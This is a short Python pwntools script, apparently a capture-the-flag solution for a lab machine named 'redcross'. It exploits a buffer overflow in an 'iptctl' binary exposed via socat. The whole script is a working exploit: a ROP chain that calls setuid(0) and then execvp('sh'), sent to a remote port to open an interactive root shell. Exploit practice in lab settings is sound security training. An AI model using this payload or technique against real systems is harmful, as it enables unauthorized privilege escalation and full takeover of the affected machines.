#!/usr/bin/env python
# on redcross setup iptctl with socat listening on 9001
# socat TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i"

from pwn import *    


# addresses
execvp  = p64(0x400760) # execve plt
setuid  = p64(0x400780) # setuid plt
pop_rdi = p64(0x400de3) # pop rdi; ret
pop_rsi = p64(0x400de1) # pop rsi; pop r15; retd
sh_str  = p64(0x40046e) # "sh"

#setup payload
payload = "allow" +("A"*29) 

# setuid(0)
payload += pop_rdi
payload += p64(0)
payload += setuid

# execvp("sh", 0)
payload += pop_rdi             
payload += sh_str           
payload += pop_rsi            
payload += p64(0)
payload += p64(0)             
payload += execvp                     

payload += "\n7.8.8.9\n"
                      
log.info("Attempting to connect")
try:
    p = remote("10.10.10.113",9001)
except pwnlib.exception.PwnlibException:
    log.warn("Could not connect to target")
    log.warn('Is socat running on target?')
    log.warn('TCP-LISTEN:9001 EXEC:"/opt/iptctl/iptctl -i" running?')
    exit()
p.sendline(payload)
p.interactive() 
